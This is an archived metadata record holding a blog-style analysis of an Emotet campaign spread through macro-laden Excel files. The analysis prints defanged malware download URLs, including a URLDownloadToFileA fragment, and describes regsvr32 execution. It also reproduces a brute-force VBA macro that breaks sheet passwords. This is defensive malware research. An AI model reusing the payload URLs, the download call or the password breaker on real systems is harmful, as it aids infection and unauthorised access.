{
    "id": "1a14c928-59a4-492f-bd7c-330f3cfeba19",
    "created_at": "2023-03-03T02:07:06.08463Z",
    "updated_at": "2025-03-27T02:05:42.908663Z",
    "deleted_at": null,
    "sha1_hash": "aeca64f4e931e159bfc844dd038f09257b8592fc",
    "title": "2023-02-26 - Emotet Campaign",
    "authors": "",
    "file_creation_date": "2023-03-01T09:37:29Z",
    "file_modification_date": "2023-03-01T09:37:29Z",
    "file_size": 164699,
    "plain_text": "# Executive Summary:\n\n**medium.com/@Ilandu/emotet-campaign-6f240f7a5ed5**\n\nIlan Duhin February 28, 2023\n\nIlan Duhin\n\nFeb 26\n\n\n5 min read\n\n## Emotet Campaign:\n\nIn the last months, there has been an extensive campaign in Europe, especially of malware\nthat calls “Emotet”. The malware arrives as an Excel file and tries to communicate with a\nnumber of URLs and in the end, download four DLL files to the machine.\n\nEmotet uses an API call of CreateDirectoryA to create a folder where the files will be saved\nlocally on the computer and from there run through Regsvr32.exe.\n\nEmotet Behavior\n\n**Static Analysis:**\n\n\n-----\n\n**OLE Tools:**\n\nChecking the file structure.\nGetting a clue that we have inside the excel\nChecking the capabilities of the file by using malwoverview.py and get some clues.\nGet inside to the third stream and extract his strings.\n\n**Find 4 suspicious URLs.**\n\nThe file contains macro. In addition, find all cells that contains the whole code.\n\n**Dynamic Analysis:**\n\nFirst, we have try to open the excel (part of office 2021) we notice that it opened without\n\n“Enable Content” pop up. after doing little research, the message shows just on 2007–2013\nversions of office. After then, Microsoft blocks the option of enabling running macros\nautomatically.\n\nTo enable macros we need to change the option like in the picture below:\n\n** in office 2007/2013 it will run by clicking “Enable Content”\n\nNeed to save and enter it again to an excel file.\n\nAnd now…\n\nWhen we press on the button, four messages pops up.\n\nchild processes of Excel.\nWhen clicking on regsvr32.exe you can see those macros using it to execute the malware. It\nacts like a dropper because it generates a folder to place his DLL there.\n\nwhen opening Excel and following the static investigation, we see 6 sheets that was hiding\nfrom the victim.\n\nEach sheet requires a password.\n\nTo extract the password, we use “password breaker for VBA”.\n\nSource: [https://www.instructables.com/VBA-Code-To-Unlock-A-Locked-Excel-Sheet/](https://www.instructables.com/VBA-Code-To-Unlock-A-Locked-Excel-Sheet/)\n\nSub PasswordBreaker()\n\n‘Breaks worksheet password protection.\n\nDim i As Integer, j As Integer, k As Integer\n\n\n-----\n\nDim l As Integer, m As Integer, n As Integer\n\nDim i1 As Integer, i2 As Integer, i3 As Integer\n\nDim i4 As Integer, i5 As Integer, i6 As Integer\n\nOn Error Resume Next\n\nFor i = 65 To 66: For j = 65 To 66: For k = 65 To 66\n\nFor l = 65 To 66: For m = 65 To 66: For i1 = 65 To 66\n\nFor i2 = 65 To 66: For i3 = 65 To 66: For i4 = 65 To 66\n\nFor i5 = 65 To 66: For i6 = 65 To 66: For n = 32 To 126\n\nActiveSheet.Unprotect Chr(i) & Chr(j) & Chr(k) & _\n\nChr(l) & Chr(m) & Chr(i1) & Chr(i2) & Chr(i3) & _\n\nChr(i4) & Chr(i5) & Chr(i6) & Chr(n)\n\nIf ActiveSheet.ProtectContents = False Then\n\nMsgBox “One usable password is “ & Chr(i) & Chr(j) & _\n\nChr(k) & Chr(l) & Chr(m) & Chr(i1) & Chr(i2) & _\n\nChr(i3) & Chr(i4) & Chr(i5) & Chr(i6) & Chr(n)\n\nExit Sub\n\nEnd If\n\nNext: Next: Next: Next: Next: Next\n\nNext: Next: Next: Next: Next: Next\n\nEnd Sub\n\n**To insert our VBA code we need to press: ALT+F11, paste it and Run.**\n\npaste the password breaker inside every sheet.\nExcel shows us automatically the password for the requested sheet.\n\nWe can verify it from press right click and see that the sheet is “Protected”.\n\n**Sheet 1 data:**\n\n\n-----\n\n**Sheet 2 data:**\n\nWhen we reorganize the strings we see four URL’s:\n\n- URLDownloadToFileA”, “JCCB”, 0, “https://audioselec.c[o]m/about/dDw5ggtyMojggTqhc\n\n- https://geringer-muehle.[de]/wp-admin/G/\n\n- http://intolove.co.[uk]/wp-admin/FbGhiWtrEzrQ/\n\n- http://isc.net.[ua]/themes/3rU/\n\n**Sheet 3 data:**\n\n**Sheet 4 data:**\n\nAnother two URL’s that we saw earlier.\n**Sheet 5 data:**\n\n**Sheet 6 data:**\n\nContains the directions of how to summarize the strings.\n\n## DLL Analysis:\n\nExport function number 18.\n\nAfter funning the DLL we found a few interesting strings in the memory tab.\n\nIn addition, it drops itself upon execution to the next path:\n\nWhen analyzing the memory string of the DLL in VT we got a description of Emotet.\n\n## Conclusions:\n\n- The macros reach out to download & execute the Emotet malware.\n\n- The excel file using macros to reach out to web URLs.\n\n- Via regsvr32.exe Emotet doing his execution.\n\n- Emotet dropper is downloaded to a randomly generated folder under\n%UserProfile%\\Appdata\\Local as a dll file.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-26 - Emotet Campaign.pdf"
    ],
    "report_names": [
        "2023-02-26 - Emotet Campaign.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1677809226,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1677663449,
    "ts_modification_date": 1677663449,
    "files": {
        "pdf": "https://archive.orkl.eu/aeca64f4e931e159bfc844dd038f09257b8592fc.pdf",
        "text": "https://archive.orkl.eu/aeca64f4e931e159bfc844dd038f09257b8592fc.txt",
        "img": "https://archive.orkl.eu/aeca64f4e931e159bfc844dd038f09257b8592fc.jpg"
    }
}